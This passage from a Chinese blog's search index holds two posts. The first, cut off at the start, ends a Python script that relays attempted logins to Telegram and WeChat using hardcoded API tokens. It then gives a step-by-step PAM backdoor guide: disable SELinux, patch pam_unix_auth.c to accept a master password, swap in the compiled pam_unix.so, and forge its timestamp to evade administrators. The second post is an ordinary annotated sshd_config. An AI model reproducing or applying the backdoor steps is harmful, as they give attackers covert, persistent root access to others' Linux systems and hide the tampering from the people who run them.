punctuation">)</span><span class="token punctuation">:</span>    apiKey <span class="token operator">=</span> <span class="token string">"1690803241:AAFlb3erITT3mAQXsWJyqky5-ppT1iLR0r8"</span>    userId <span class="token operator">=</span> <span class="token string">"1081557726"</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"chat_id"</span><span class="token punctuation">:</span>userId<span class="token punctuation">,</span><span class="token string">"text"</span><span class="token punctuation">:</span>msg<span class="token punctuation">}</span>    url <span class="token operator">=</span> <span class="token string">"https://api.telegram.org/bot{}/sendMessage"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>apiKey<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>json<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token operator">//</span>转发推送到微信，使用server酱api<span class="token keyword">def</span> <span class="token function">sendMessage_Wechat</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    SCKEY <span class="token operator">=</span> <span class="token string">"SCU90806Tcd03301290315424fa3c008bc5cc6735600505d0cf248"</span>    urlWechat <span class="token operator">=</span> <span class="token string">"https://sc.ftqq.com/{}.send"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>SCKEY<span class="token punctuation">)</span>    title <span class="token operator">=</span> <span class="token string">"有用户尝试登录"</span>    params<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">'text'</span><span class="token punctuation">:</span>title<span class="token punctuation">,</span>        <span class="token string">'desp'</span><span class="token punctuation">:</span>msg    <span class="token punctuation">}</span>    rr <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>urlWechat<span class="token punctuation">,</span>data <span class="token operator">=</span> params<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8443</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="PAM后门-万能密码"><a href="#PAM后门-万能密码" class="headerlink" title="PAM后门 万能密码"></a>PAM后门 万能密码</h3><p>centos需要关闭selinux，临时关闭<code>setenforce 0</code>。永久关闭需要修改<code>/etc/selinux/config</code>，将其中SELINUX设置为disabled。</p><h4 id="下载对应PAM版本的"><a href="#下载对应PAM版本的" class="headerlink" title="下载对应PAM版本的"></a>下载对应PAM版本的</h4><p>下载对应源码:<a href="http://www.linux-pam.org/library/">http://www.linux-pam.org/library/</a></p><pre class="line-numbers language-bas" data-language="bas"><code class="language-bas">wget http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gztar zxvf Linux-PAM-1.1.8.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装gcc编译器和flex库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> gcc flex flex-devel -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ubuntu系统同理</p><p>修改<code>Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c</code>源码实现自定义密码认证</p><p><img src="./medias/detail/load.gif" data-original="https://blog.ryzezr.com/usr/uploads/2021/05/1034017245.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/* verify the password of this user */retval <span class="token operator">=</span> _unix_verify_password<span class="token punctuation">(</span>pamh, name, p, ctrl<span class="token punctuation">)</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>strcmp<span class="token punctuation">(</span><span class="token string">"wannengmima"</span>,p<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>return PAM_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">}</span>name <span class="token operator">=</span> p <span class="token operator">=</span> NULL<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>编译成so动态链接库文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> Linux-PAM-1.1.8./configure --prefix<span class="token operator">=</span>/user --exec-prefix<span class="token operator">=</span>/usr --localstatedir<span class="token operator">=</span>/var --sysconfdir<span class="token operator">=</span>/etc --disable-selinux --with-libiconv-prefix<span class="token operator">=</span>/usr<span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>生成的恶意认证so路径在<code>./modules/pam_unix/.libs/pam_unix.so</code>。用它来替换系统自带的pam_unix.so。</p><p>因为系统不同位数不同，pam_unix.so的路径也不一样，尽量用find找一下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -name <span class="token string">"pam_unix.so"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后替换，注意先备份，万一恶意的so文件不可用就GG了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/lib64/security/pam_unix.so /tmp/pam_unix.so.bak<span class="token function">cp</span> /root/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /usr/lib64/security/pam_unix.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>此时切记不能断开ssh，再开一个终端ssh链接一下试试。</strong></p><p>成功登录，后门OK了，修改下pam_unix.so的时间戳，增加系统管理员查找难度</p><p>在<code>/usr/lib64/security/</code>下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> pam_unix.so -r pam_umask.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>整理自：</strong></p><p><a href="https://gorgias.me/2018/03/25/Linux-%E5%90%8E%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-PAM%E5%90%8E%E9%97%A8/">Linux-后渗透笔记-PAM后门</a><br><a href="https://mp.weixin.qq.com/s/M8chPphMprAK56-ScTQ-Qg">Linux PAM后门：窃取ssh密码及自定义密码登录</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh服务端配置文件整理</title>
      <link href="posts/3881.html"/>
      <url>posts/3881.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-ssh远程登录配置文件说明"><a href="#1-ssh远程登录配置文件说明" class="headerlink" title="1. ssh远程登录配置文件说明"></a>1. ssh远程登录配置文件说明</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#$OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $</span><span class="token comment"># This is the sshd server system-wide configuration file.  See</span><span class="token comment"># sshd_config(5) for more information.</span><span class="token comment"># This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin</span><span class="token comment"># The strategy used for options in the default sshd_config shipped with</span><span class="token comment"># OpenSSH is to specify options with their default value where</span><span class="token comment"># possible, but leave them commented.  Uncommented options override the</span><span class="token comment"># default value.</span><span class="token comment">#监听的端口</span><span class="token comment">#Port 22</span><span class="token comment">#家族地址，any表示同时监听ipv4和ipv6</span><span class="token comment">#AddressFamily any</span><span class="token comment">#监听本机所有IPv4地址</span><span class="token comment">#ListenAddress 0.0.0.0</span><span class="token comment">#监听本机所有IPv6地址</span><span class="token comment">#ListenAddress ::</span><span class="token comment">#ssh所使用的RSA私钥路径</span><span class="token comment">#HostKey /etc/ssh/ssh_host_rsa_key</span><span class="token comment">#HostKey /etc/ssh/ssh_host_ecdsa_key</span><span class="token comment">#HostKey /etc/ssh/ssh_host_ed25519_key</span><span class="token comment"># Ciphers and keying</span><span class="token comment">#RekeyLimit default none</span><span class="token comment"># Logging</span><span class="token comment">#设定在记录来自sshd的消息的时候，是否给出“facility code</span><span class="token comment">#SyslogFacility AUTH</span><span class="token comment">#日志记录级别，默认为info</span><span class="token comment">#LogLevel INFO</span><span class="token comment"># Authentication:</span><span class="token comment">#限定用户认证时间为2min</span><span class="token comment">#LoginGraceTime 2m</span><span class="token comment">#是否允许root账户ssh登录,生成环境使用root账号登录危害极大,自己玩玩就无所谓了</span><span class="token comment">#PermitRootLogin prohibit-password</span>PermitRootLogin <span class="token function">yes</span><span class="token comment">#设置ssh在接收登录请求之前是否检查用户根目录和rhosts文件的权限和所有权，建议开启</span><span class="token comment">#StrictModes yes</span><span class="token comment">#指定每个连接最大允许的认证次数。默认值是</span><span class="token comment">#MaxAuthTries 6</span><span class="token comment">#最大允许保持多少个连接。默认值是 10</span><span class="token comment">#MaxSessions 10</span><span class="token comment">#是否开启公钥验证</span><span class="token comment">#PubkeyAuthentication yes</span>PubkeyAuthentication <span class="token function">yes</span><span class="token comment"># Expect .ssh/authorized_keys2 to be disregarded by default in future.</span><span class="token comment">#公钥验证文件路径</span><span class="token comment">#AuthorizedKeysFile.ssh/authorized_keys .ssh/authorized_keys2</span>AuthorizedKeysFile.ssh/authorized_keys %h/.ssh/authorized_keys2<span class="token comment">#AuthorizedPrincipalsFile none</span><span class="token comment">#AuthorizedKeysCommand none</span><span class="token comment">#AuthorizedKeysCommandUser nobody</span><span class="token comment"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><span class="token comment">#HostbasedAuthentication no</span><span class="token comment"># Change to yes if you don't trust ~/.ssh/known_hosts for</span><span class="token comment"># HostbasedAuthentication</span><span class="token comment">#IgnoreUserKnownHosts no</span><span class="token comment"># Don't read the user's ~/.rhosts and ~/.shosts files</span><span class="token comment">#IgnoreRhosts yes</span><span class="token comment"># To disable tunneled clear text passwords, change to no here!</span><span class="token comment">#是否允许密码验证</span><span class="token comment">#PasswordAuthentication yes</span>PasswordAuthentication <span class="token function">yes</span><span class="token comment">#是否允许空密码登录</span><span class="token comment">#PermitEmptyPasswords no</span><span class="token comment"># Change to yes to enable challenge-response passwords (beware issues with</span><span class="token comment"># some PAM modules and threads)</span><span class="token comment">#是否允许质疑-应答(challenge-response)认证</span>ChallengeResponseAuthentication no<span class="token comment"># Kerberos options</span><span class="token comment">#KerberosAuthentication no</span><span class="token comment">#KerberosOrLocalPasswd yes</span><span class="token comment">#KerberosTicketCleanup yes</span><span class="token comment">#KerberosGetAFSToken no</span><span class="token comment"># GSSAPI options</span><span class="token comment">#是否允许基于GSSAPI的用户认证</span><span class="token comment">#GSSAPIAuthentication no</span><span class="token comment">#是否在用户退出登录后自动销毁用户凭证缓存</span><span class="token comment">#GSSAPICleanupCredentials yes</span><span class="token comment">#GSSAPIStrictAcceptorCheck yes</span><span class="token comment">#GSSAPIKeyExchange no</span><span class="token comment"># Set this to 'yes' to enable PAM authentication, account processing,</span><span class="token comment"># and session processing. If this is enabled, PAM authentication will</span><span class="token comment"># be allowed through the ChallengeResponseAuthentication and</span><span class="token comment"># PasswordAuthentication.  Depending on your PAM configuration,</span><span class="token comment"># PAM authentication via ChallengeResponseAuthentication may bypass</span><span class="token comment"># the setting of "PermitRootLogin without-password".</span><span class="token comment"># If you just want the PAM account and session checks to run without</span><span class="token comment"># PAM authentication, then enable this but set PasswordAuthentication</span><span class="token comment"># and ChallengeResponseAuthentication to 'no'.</span><span class="token comment">#是否通过PAM验证</span>UsePAM <span class="token function">yes</span><span class="token comment">#AllowAgentForwarding yes</span><span class="token comment">#AllowTcpForwarding yes</span><span class="token comment">#是否允许远程主机连接本地的转发端口</span><span class="token comment">#GatewayPorts no</span><span class="token comment">#是否允许X11转发</span>X11Forwarding <span class="token function">yes</span><span class="token comment">#X11DisplayOffset 10</span><span class="token comment">#X11UseLocalhost yes</span><span class="token comment">#PermitTTY yes</span><span class="token comment">#是否在每一次交互式登录时打印 /etc/motd 文件的内</span>PrintMotd <span class="token function">yes</span><span class="token comment">#PrintLastLog yes</span>PrintLastLog <span class="token function">yes</span><span class="token comment">#TCPKeepAlive yes</span><span class="token comment">#PermitUserEnvironment no</span><span class="token comment">#Compression delayed</span><span class="token comment">#ClientAliveInterval 0</span><span class="token comment">#ClientAliveCountMax 3</span><span class="token comment">#UseDNS no</span><span class="token comment">#PidFile /var/run/sshd.pid</span><span class="token comment">#MaxStartups 10:30:100</span><span class="token comment">#PermitTunnel no</span><span class="token comment">#ChrootDirectory none</span><span class="token comment">#VersionAddendum none</span><span class="token comment"># no default banner path</span><span class="token comment">#Banner none</span><span class="token comment"># Allow client to pass locale environment variables</span>AcceptEnv <span class="token environment constant">LANG</span> LC_*<span class="token comment"># override default of no subsystems</span>Subsystem<span class="token function">sftp</span>/usr/lib/openssh/sftp-server<span class="token comment"># Example of overriding settings on a per-user basis</span><span class="token comment">#Match User anoncvs</span><span class="token comment">#X11Forwarding no</span><span class="token comment">#AllowTcpForwarding no</span><span class="token comment">#PermitTTY no</span><span class="token comment">#ForceCommand cvs server</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-普通用户使用密钥登录时出现的问题"><a href="#2-普通用户使用密钥登录时出现的问题" class="headerlink" title="2. 普通用户使用密钥登录时出现的问题"></a>2. 普通用户使用密钥登录时出现的问题</h3><h4 id="1-普通用户家目录下-ssh-authorized-keys-权限配置不对"><a href="#1-普通用户家目录下-ssh-authorized-keys-权限配置不对" class="headerlink" title="1. 普通用户家目录下 ./ssh/authorized_keys 权限配置不对"></a>1. 普通用户家目录下 ./ssh/authorized_keys 权限配置不对</h4><p><img src="./medias/detail/load.gif" data-original="https://blog.ryzezr.com/usr/uploads/2021/05/580441958.png"></p><p>此时<code>drcom</code>用户的<code> authorized_keys</code>文件是 <code>600</code>权限，虽然已经正确配置了密钥，但是登录时依然需要drcom用户提供密码</p><p>修改 <code>/home/drcom/.ssh/authorized_keys </code>的权限为 <code>644</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">644</span> authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="./medias/detail/load.gif" data-original="https://blog.ryzezr.com/usr/uploads/2021/05/3676596635.png"></p><p>修改完权限后，drcom能通过密钥正常登录</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol><li><a href="https://segmentfault.com/q/1010000000613569">普通用户 ssh 密钥登录失败的问题，困惑了很久</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh配置文件 </tag>
            
            <tag> ssh远程登录时遇到的问题 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
